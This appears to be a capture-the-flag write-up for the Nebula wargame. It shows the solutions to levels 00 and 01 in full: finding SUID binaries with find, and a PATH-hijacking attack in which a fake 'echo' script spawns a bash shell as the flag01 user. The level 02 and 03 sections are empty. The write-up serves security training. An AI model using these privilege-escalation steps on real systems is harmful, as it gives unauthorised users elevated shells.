## Exploit Exercise -- Nebula

### Level 00
#### Chall. Description
> This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

#### Solution
To find the file, we can use `find` command. Specify `-perm -4000` for SUID and `-user flag00` for the user `flag00`. And since we are going to search from `/`, there will be a lot of "Permission denied" error, we can redirect the stderr to `/dev/null` for the cleanness of the output. 
```bash
level00@nebula:~$ find / -perm -4000 -user flag00 2>/dev/null
/bin/.../flag00
/rofs/bin/.../flag00
```
Both of the binary will do. We can run either of them and run `getflag` to get the flag.
```bash
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ whoami
flag00
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 01
#### Chall. Description
> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
> Files for this level can be found in /home/flag01.
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

#### Solution
The binary will get the effective UID and GID, then set it as the real, effective and saved set-user-ID UID. Since the binary has SUID set, the effective UID while running this binary will be the target user `flag01`.
```bash
level01@nebula:~$ ls -l /home/flag01/flag01
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 /home/flag01/flag01
```
`system()` function executes the command `echo` without specifying the absoulte path, so we can do PATH hijacking here.

First, we create a file named `echo`, which will actually give us a bash shell, and make it executable.
```bash
level01@nebula:~$ cat << EOF > echo
> #!/bin/bash
> /bin/bash -ip
> EOF
level01@nebula:~$ chmod +x echo
```
Then we can hijack the `PATH` environment variable and get the shell of the user `flag01`.
```bash
level01@nebula:~$ PATH=/home/level01:$PATH /home/flag01/flag01
flag01@nebula:~$ whoami
flag01
flag01@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 02
#### Chall. Description

#### Solution


### Level 03
#### Chall. Description

#### Solution
